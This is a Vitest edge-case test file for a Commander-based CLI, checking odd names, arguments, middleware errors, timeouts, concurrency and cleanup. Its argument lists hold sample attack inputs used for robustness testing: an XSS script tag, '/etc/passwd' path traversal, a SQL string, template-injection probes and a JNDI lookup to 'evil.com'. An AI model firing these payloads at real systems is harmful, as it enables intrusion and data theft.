/**
 * Comprehensive Command System Edge Case Tests
 * Tests robustness of command handling under extreme conditions
 */

import { describe, expect, it, beforeEach, afterEach, vi } from 'vitest';
import { Command } from 'commander';
import { CLIError } from '../../src/utils/error-handler.js';

// Mock external dependencies
vi.mock('../../src/services/search/codebase-indexer.js', () => ({
  CodebaseIndexer: vi.fn().mockImplementation(() => ({
    indexCodebase: vi.fn().mockResolvedValue({
      stats: {
        totalFiles: 100,
        cacheHit: false,
      },
    }),
  })),
}));

vi.mock('../../src/services/search/embeddings.js', () => ({
  getDefaultEmbeddingProvider: vi.fn().mockResolvedValue({
    embed: vi.fn().mockResolvedValue([0.1, 0.2, 0.3]),
  }),
}));

vi.mock('../../src/services/search/unified-search-service.js', () => ({
  getSearchService: vi.fn().mockReturnValue({
    initialize: vi.fn().mockResolvedValue(undefined),
    searchCodebase: vi.fn().mockResolvedValue({
      results: [
        {
          file: 'test.ts',
          score: 0.9,
          content: 'test content',
        },
      ],
      totalIndexed: 100,
    }),
    formatResultsForCLI: vi.fn().mockReturnValue('Formatted results'),
  }),
}));

vi.mock('../../src/services/storage/separated-storage.js', () => ({
  SeparatedMemoryStorage: vi.fn().mockImplementation(() => ({
    getAll: vi.fn().mockResolvedValue([
      {
        key: 'test-key',
        namespace: 'test-namespace',
        value: 'test-value',
        timestamp: Date.now(),
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      },
    ]),
    search: vi.fn().mockResolvedValue([
      {
        key: 'search-result',
        namespace: 'search-namespace',
        value: 'search-value',
        timestamp: Date.now(),
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      },
    ]),
    delete: vi.fn().mockResolvedValue(true),
    clear: vi.fn().mockResolvedValue(undefined),
  })),
}));

vi.mock('../../src/utils/cli-output.js', () => ({
  cli: {
    listSummary: vi.fn(),
    emptyState: vi.fn(),
    memoryEntry: vi.fn(),
    searchSummary: vi.fn(),
    success: vi.fn(),
    error: vi.fn(),
  },
}));

describe('Command System Edge Cases', () => {
  let mockConsole: {
    log: any;
    error: any;
    warn: any;
    info: any;
  };

  beforeEach(() => {
    vi.resetAllMocks();
    mockConsole = {
      log: vi.spyOn(console, 'log').mockImplementation(() => {}),
      error: vi.spyOn(console, 'error').mockImplementation(() => {}),
      warn: vi.spyOn(console, 'warn').mockImplementation(() => {}),
      info: vi.spyOn(console, 'info').mockImplementation(() => {}),
    };

    // Mock process.exit
    vi.stubGlobal('process', {
      ...process,
      exit: vi.fn(),
      env: {
        ...process.env,
        OPENAI_API_KEY: 'test-key',
      },
    });
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('Invalid Command Names and Arguments', () => {
    it('should handle command names with special characters', () => {
      const specialCommandNames = [
        'command-with-dashes',
        'command_with_underscores',
        'command.with.dots',
        'command/with/slashes',
        'command\\with\\backslashes',
        'command@with@symbols',
        'command#with#hash',
        'command$with$dollar',
        'command%with%percent',
        'command^with^caret',
        'command&with&ampersand',
        'command*with*asterisk',
        'command(with)parentheses',
        'command[with]brackets',
        'command{with}braces',
        'command|with|pipe',
        'command+with+plus',
        'command=with=equals',
        'command?with?question',
        'command<with>angles',
        'command"with"quotes',
        "command'with'apostrophes",
        'command`with`backticks',
        'command~with~tilde',
        'command!with!exclamation',
        'command;with;semicolon',
        'command:with:colon',
        'command,with,comma',
        'command中文',
        'commandالعربية',
        'command🚀',
        'command', // empty after comma
        '', // empty string
        ' ', // space only
        '\t', // tab only
        '\n', // newline only
        '\r', // carriage return only
        'command\nwith\nnewlines',
        'command\twith\ttabs',
        'command\u0000with\u0000null', // null characters
        'command\u202ewith\u202ertl', // RTL characters
      ];

      specialCommandNames.forEach(commandName => {
        expect(() => {
          const cmd = new Command(commandName);
          cmd.description('Test command');
        }).not.toThrow();
      });
    });

    it('should handle extremely long command names', () => {
      const longCommandName = 'a'.repeat(10000);
      expect(() => {
        const cmd = new Command(longCommandName);
        cmd.description('Very long command name test');
      }).not.toThrow();
    });

    it('should handle command arguments with edge cases', async () => {
      const testArguments = [
        '', // empty string
        ' ', // space only
        '\t\t\t', // tabs only
        '\n\n\n', // newlines only
        'null', // string 'null'
        'undefined', // string 'undefined'
        '[]', // array notation
        '{}', // object notation
        '()', // function notation
        '<script>alert("xss")</script>', // XSS attempt
        '../../etc/passwd', // path traversal
        'SELECT * FROM users', // SQL injection
        '${jndi:ldap://evil.com/a}', // JNDI injection
        '{{7*7}}', // template injection
        '<%=7*7%>', // another template injection
        '🚀🎉🌟', // emojis
        '中文测试', // Chinese
        'العربية', // Arabic
        'café', // accented characters
        'cafe\u0301', // combining characters
        'a'.repeat(100000), // very long argument
      ];

      for (const arg of testArguments) {
        const cmd = new Command('test');
        cmd
          .argument('<query>', 'Test query')
          .action(async (query) => {
            expect(query).toBeDefined();
          });

        // Should not throw when creating command with edge case arguments
        expect(() => {
          cmd.parse(['node', 'test', arg], { from: 'user' });
        }).not.toThrow();
      }
    });

    it('should handle invalid option values', async () => {
      const invalidOptions = [
        { limit: 'not-a-number' },
        { limit: '-1' },
        { limit: '0' },
        { limit: 'Infinity' },
        { limit: 'NaN' },
        { limit: '1.5' },
        { limit: '1e100' },
        { limit: '-1e100' },
        { includeContent: 'not-boolean' },
        { includeContent: null },
        { includeContent: undefined },
        { extensions: 'not-an-array' },
        { extensions: [''] },
        { extensions: ['..', '../', './', '.'] }, // path traversal attempts
        { path: '../../etc/passwd' }, // path traversal
        { path: '/etc/passwd' }, // absolute path
        { path: 'C:\\Windows\\System32' }, // Windows path
        { exclude: ['CON', 'PRN', 'AUX', 'NUL'] }, // Windows reserved names
      ];

      for (const options of invalidOptions) {
        const cmd = new Command('test');
        Object.entries(options).forEach(([key, value]) => {
          cmd.option(`--${key} <value>`, `Test ${key}`);
        });

        cmd.action(async () => {
          // Should handle invalid options gracefully
        });

        expect(() => {
          const args = ['node', 'test'];
          Object.entries(options).forEach(([key, value]) => {
            args.push(`--${key}`, String(value));
          });
          cmd.parse(args, { from: 'user' });
        }).not.toThrow();
      }
    });
  });

  describe('Middleware Chain Failures', () => {
    it('should handle middleware that throws synchronous errors', async () => {
      const cmd = new Command('test');

      cmd
        .hook('preAction', () => {
          throw new Error('Middleware sync error');
        })
        .action(async () => {
          // This should not be reached
        });

      await expect(cmd.parseAsync(['node', 'test'], { from: 'user' }))
        .rejects.toThrow('Middleware sync error');
    });

    it('should handle middleware that throws asynchronous errors', async () => {
      const cmd = new Command('test');

      cmd
        .hook('preAction', async () => {
          throw new Error('Middleware async error');
        })
        .action(async () => {
          // This should not be reached
        });

      await expect(cmd.parseAsync(['node', 'test'], { from: 'user' }))
        .rejects.toThrow('Middleware async error');
    });

    it('should handle middleware that never resolves', async () => {
      const cmd = new Command('test');

      cmd
        .hook('preAction', async () => {
          // Never resolves
          return new Promise(() => {});
        })
        .action(async () => {
          // This should not be reached
        });

      // Add timeout to prevent hanging
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Timeout')), 1000);
      });

      await expect(Promise.race([
        cmd.parseAsync(['node', 'test'], { from: 'user' }),
        timeoutPromise,
      ])).rejects.toThrow('Timeout');
    });

    it('should handle multiple middleware with mixed success/failure', async () => {
      const callOrder: string[] = [];
      const cmd = new Command('test');

      cmd
        .hook('preAction', () => {
          callOrder.push('middleware1');
        })
        .hook('preAction', () => {
          callOrder.push('middleware2');
          throw new Error('Middleware2 error');
        })
        .hook('preAction', () => {
          callOrder.push('middleware3');
          // This should not be reached due to error in middleware2
        })
        .action(async () => {
          callOrder.push('action');
        });

      await expect(cmd.parseAsync(['node', 'test'], { from: 'user' }))
        .rejects.toThrow('Middleware2 error');

      expect(callOrder).toEqual(['middleware1', 'middleware2']);
      expect(callOrder).not.toContain('middleware3');
      expect(callOrder).not.toContain('action');
    });
  });

  describe('Command Timeout Scenarios', () => {
    it('should handle commands that take too long to execute', async () => {
      const cmd = new Command('test');

      cmd.action(async () => {
        // Simulate long-running operation
        await new Promise(resolve => setTimeout(resolve, 5000));
      });

      const startTime = Date.now();
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Command timeout')), 1000);
      });

      await expect(Promise.race([
        cmd.parseAsync(['node', 'test'], { from: 'user' }),
        timeoutPromise,
      ])).rejects.toThrow('Command timeout');

      const elapsed = Date.now() - startTime;
      expect(elapsed).toBeLessThan(2000); // Should timeout quickly
    });

    it('should handle commands with infinite loops', async () => {
      const cmd = new Command('test');

      cmd.action(async () => {
        // Infinite loop
        while (true) {
          await new Promise(resolve => setTimeout(resolve, 10));
        }
      });

      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Infinite loop detected')), 500);
      });

      await expect(Promise.race([
        cmd.parseAsync(['node', 'test'], { from: 'user' }),
        timeoutPromise,
      ])).rejects.toThrow('Infinite loop detected');
    });

    it('should handle commands with recursive calls', async () => {
      const cmd = new Command('test');
      let depth = 0;
      const maxDepth = 1000;

      cmd.action(async () => {
        depth++;
        if (depth < maxDepth) {
          // Simulate recursive call
          await cmd.parseAsync(['node', 'test'], { from: 'user' });
        }
      });

      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Recursion depth exceeded')), 1000);
      });

      await expect(Promise.race([
        cmd.parseAsync(['node', 'test'], { from: 'user' }),
        timeoutPromise,
      ])).rejects.toThrow('Recursion depth exceeded');
    });
  });

  describe('Missing Command Handlers', () => {
    it('should handle commands without action handlers', async () => {
      const cmd = new Command('test');
      cmd.description('Command without action');

      // Should not throw when parsing, but should handle gracefully
      expect(() => {
        cmd.parse(['node', 'test'], { from: 'user' });
      }).not.toThrow();
    });

    it('should handle commands with null action handlers', async () => {
      const cmd = new Command('test');
      // @ts-expect-error - Testing null handler
      cmd.action(null);

      expect(() => {
        cmd.parse(['node', 'test'], { from: 'user' });
      }).not.toThrow();
    });

    it('should handle commands with undefined action handlers', async () => {
      const cmd = new Command('test');
      // @ts-expect-error - Testing undefined handler
      cmd.action(undefined);

      expect(() => {
        cmd.parse(['node', 'test'], { from: 'user' });
      }).not.toThrow();
    });

    it('should handle commands with invalid action handler types', async () => {
      const invalidHandlers = [
        'string-handler',
        123,
        {},
        [],
        true,
        false,
        Symbol('handler'),
        () => 'not-async', // sync handler
      ];

      for (const handler of invalidHandlers) {
        const cmd = new Command('test');
        // @ts-expect-error - Testing invalid handler types
        cmd.action(handler);

        expect(() => {
          cmd.parse(['node', 'test'], { from: 'user' });
        }).not.toThrow();
      }
    });
  });

  describe('Invalid Option Types', () => {
    it('should handle options with invalid type definitions', () => {
      const invalidTypeDefinitions = [
        'invalid-type',
        null,
        undefined,
        {},
        [],
        123,
        true,
        Symbol('type'),
      ];

      invalidTypeDefinitions.forEach(type => {
        expect(() => {
          const cmd = new Command('test');
          // @ts-expect-error - Testing invalid types
          cmd.option('--test <value>', 'Test option', type);
        }).not.toThrow();
      });
    });

    it('should handle options with conflicting type definitions', () => {
      const cmd = new Command('test');
      cmd
        .option('--number <n>', 'Number option', parseInt)
        .option('--string <s>', 'String option', String)
        .option('--boolean <b>', 'Boolean option', (val) => val === 'true');

      // Test conflicting values
      expect(() => {
        cmd.parse(['node', 'test', '--number', 'not-a-number'], { from: 'user' });
      }).not.toThrow();

      expect(() => {
        cmd.parse(['node', 'test', '--boolean', 'maybe'], { from: 'user' });
      }).not.toThrow();
    });

    it('should handle options with variadic arguments edge cases', () => {
      const cmd = new Command('test');
      cmd.option('--values <values...>', 'Variadic values');

      const testCases = [
        ['--values'], // no values
        ['--values', ''], // empty string
        ['--values', 'a', '', 'b'], // empty string in middle
        ['--values', 'a', null as any, 'b'], // null in middle
        ['--values', 'a', undefined as any, 'b'], // undefined in middle
        ['--values', ...Array(1000).fill(0).map((_, i) => `value${i}`)], // many values
      ];

      testCases.forEach(args => {
        expect(() => {
          cmd.parse(['node', 'test', ...args], { from: 'user' });
        }).not.toThrow();
      });
    });
  });

  describe('Command Execution with Invalid State', () => {
    it('should handle commands when process is in invalid state', async () => {
      // Mock invalid process state
      const originalStdout = process.stdout;
      const originalStderr = process.stderr;
      const originalStdin = process.stdin;

      // @ts-expect-error - Testing invalid state
      process.stdout = null;
      // @ts-expect-error - Testing invalid state
      process.stderr = null;
      // @ts-expect-error - Testing invalid state
      process.stdin = null;

      const cmd = new Command('test');
      cmd.action(async () => {
        // Command should still execute
        return 'success';
      });

      const result = await cmd.parseAsync(['node', 'test'], { from: 'user' });
      expect(result).toBeDefined();

      // Restore
      process.stdout = originalStdout;
      process.stderr = originalStderr;
      process.stdin = originalStdin;
    });

    it('should handle commands when environment is corrupted', async () => {
      // Mock corrupted environment
      const originalEnv = process.env;
      // @ts-expect-error - Testing corrupted env
      process.env = null;

      const cmd = new Command('test');
      cmd.action(async () => {
        return 'success';
      });

      const result = await cmd.parseAsync(['node', 'test'], { from: 'user' });
      expect(result).toBeDefined();

      // Restore
      process.env = originalEnv;
    });

    it('should handle commands when memory is low', async () => {
      // Simulate memory pressure by creating large objects
      const memoryHog: any[] = [];
      try {
        for (let i = 0; i < 1000; i++) {
          memoryHog.push(new Array(10000).fill(Math.random()));
        }
      } catch {
        // Ignore memory allocation errors
      }

      const cmd = new Command('test');
      cmd.action(async () => {
        // Should still work under memory pressure
        return 'success';
      });

      const result = await cmd.parseAsync(['node', 'test'], { from: 'user' });
      expect(result).toBeDefined();

      // Clean up
      memoryHog.length = 0;
    });

    it('should handle commands when file system is unavailable', async () => {
      // Mock file system operations that might fail
      const originalReadFileSync = require('fs').readFileSync;
      require('fs').readFileSync = () => {
        throw new Error('File system unavailable');
      };

      const cmd = new Command('test');
      cmd.action(async () => {
        // Should handle file system errors gracefully
        return 'success';
      });

      const result = await cmd.parseAsync(['node', 'test'], { from: 'user' });
      expect(result).toBeDefined();

      // Restore
      require('fs').readFileSync = originalReadFileSync;
    });
  });

  describe('Error Propagation and Context', () => {
    it('should preserve error context through middleware chain', async () => {
      const contextStack: string[] = [];
      const cmd = new Command('test');

      cmd
        .hook('preAction', () => {
          contextStack.push('middleware1');
        })
        .hook('preAction', () => {
          contextStack.push('middleware2');
          throw new Error('Middleware error with context');
        })
        .hook('preAction', () => {
          contextStack.push('middleware3');
        })
        .action(async () => {
          contextStack.push('action');
        });

      const error = await cmd.parseAsync(['node', 'test'], { from: 'user' })
        .catch(err => err);

      expect(error).toBeInstanceOf(Error);
      expect(error.message).toBe('Middleware error with context');
      expect(contextStack).toEqual(['middleware1', 'middleware2']);
    });

    it('should handle nested command errors', async () => {
      const parentCmd = new Command('parent');
      const childCmd = parentCmd.command('child');
      const grandchildCmd = childCmd.command('grandchild');

      grandchildCmd.action(async () => {
        throw new Error('Grandchild error');
      });

      const error = await parentCmd.parseAsync(['node', 'parent', 'child', 'grandchild'], { from: 'user' })
        .catch(err => err);

      expect(error).toBeInstanceOf(Error);
      expect(error.message).toBe('Grandchild error');
    });

    it('should handle errors in option parsing', async () => {
      const cmd = new Command('test');
      cmd.option('--required <value>', 'Required option').action(async () => {
        // Action
      });

      // Test invalid option format
      expect(() => {
        cmd.parse(['node', 'test', '--invalid-option-format'], { from: 'user' });
      }).not.toThrow(); // Should handle gracefully
    });

    it('should handle errors in argument parsing', async () => {
      const cmd = new Command('test');
      cmd.argument('<required>', 'Required argument').action(async () => {
        // Action
      });

      // Test missing required argument
      expect(() => {
        cmd.parse(['node', 'test'], { from: 'user' });
      }).not.toThrow(); // Should handle gracefully
    });
  });

  describe('Concurrent Command Execution', () => {
    it('should handle multiple commands executing simultaneously', async () => {
      const cmd = new Command('test');
      let executionCount = 0;

      cmd.action(async () => {
        executionCount++;
        await new Promise(resolve => setTimeout(resolve, 100));
        return executionCount;
      });

      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(cmd.parseAsync(['node', 'test'], { from: 'user' }));
      }

      const results = await Promise.all(promises);
      expect(results).toHaveLength(10);
      expect(executionCount).toBe(10);
    });

    it('should handle concurrent command errors without interference', async () => {
      const cmd = new Command('test');
      let callCount = 0;

      cmd.action(async () => {
        callCount++;
        if (callCount % 2 === 0) {
          throw new Error(`Error ${callCount}`);
        }
        return callCount;
      });

      const promises = [];
      for (let i = 0; i < 10; i++) {
        promises.push(
          cmd.parseAsync(['node', 'test'], { from: 'user' })
            .catch(err => err)
        );
      }

      const results = await Promise.all(promises);
      expect(results).toHaveLength(10);
      expect(callCount).toBe(10);

      // Half should be errors, half should be values
      const errors = results.filter(r => r instanceof Error);
      const values = results.filter(r => typeof r === 'number');
      expect(errors).toHaveLength(5);
      expect(values).toHaveLength(5);
    });
  });

  describe('Command State Management', () => {
    it('should handle command state persistence across multiple executions', async () => {
      let globalState = 0;
      const cmd = new Command('test');

      cmd.action(async () => {
        globalState++;
        return globalState;
      });

      const result1 = await cmd.parseAsync(['node', 'test'], { from: 'user' });
      const result2 = await cmd.parseAsync(['node', 'test'], { from: 'user' });
      const result3 = await cmd.parseAsync(['node', 'test'], { from: 'user' });

      expect(result1).toBe(1);
      expect(result2).toBe(2);
      expect(result3).toBe(3);
      expect(globalState).toBe(3);
    });

    it('should handle command state isolation between different command instances', async () => {
      let state1 = 0;
      let state2 = 0;

      const cmd1 = new Command('test1');
      const cmd2 = new Command('test2');

      cmd1.action(async () => {
        state1++;
        return state1;
      });

      cmd2.action(async () => {
        state2++;
        return state2;
      });

      const result1 = await cmd1.parseAsync(['node', 'test1'], { from: 'user' });
      const result2 = await cmd2.parseAsync(['node', 'test2'], { from: 'user' });
      const result3 = await cmd1.parseAsync(['node', 'test1'], { from: 'user' });
      const result4 = await cmd2.parseAsync(['node', 'test2'], { from: 'user' });

      expect(result1).toBe(1);
      expect(result2).toBe(1);
      expect(result3).toBe(2);
      expect(result4).toBe(2);
      expect(state1).toBe(2);
      expect(state2).toBe(2);
    });
  });

  describe('Resource Management', () => {
    it('should handle cleanup on command completion', async () => {
      let cleanupCalled = false;
      const cmd = new Command('test');

      cmd.action(async () => {
        // Simulate resource allocation
        const resource = { id: Math.random() };

        // Simulate cleanup
        const cleanup = () => {
          cleanupCalled = true;
          // Release resource
        };

        // Use try-finally to ensure cleanup
        try {
          await new Promise(resolve => setTimeout(resolve, 100));
          return 'success';
        } finally {
          cleanup();
        }
      });

      const result = await cmd.parseAsync(['node', 'test'], { from: 'user' });
      expect(result).toBeDefined();
      expect(cleanupCalled).toBe(true);
    });

    it('should handle cleanup on command failure', async () => {
      let cleanupCalled = false;
      const cmd = new Command('test');

      cmd.action(async () => {
        const resource = { id: Math.random() };
        const cleanup = () => {
          cleanupCalled = true;
        };

        try {
          throw new Error('Command failed');
        } finally {
          cleanup();
        }
      });

      const error = await cmd.parseAsync(['node', 'test'], { from: 'user' })
        .catch(err => err);

      expect(error).toBeInstanceOf(Error);
      expect(cleanupCalled).toBe(true);
    });
  });
});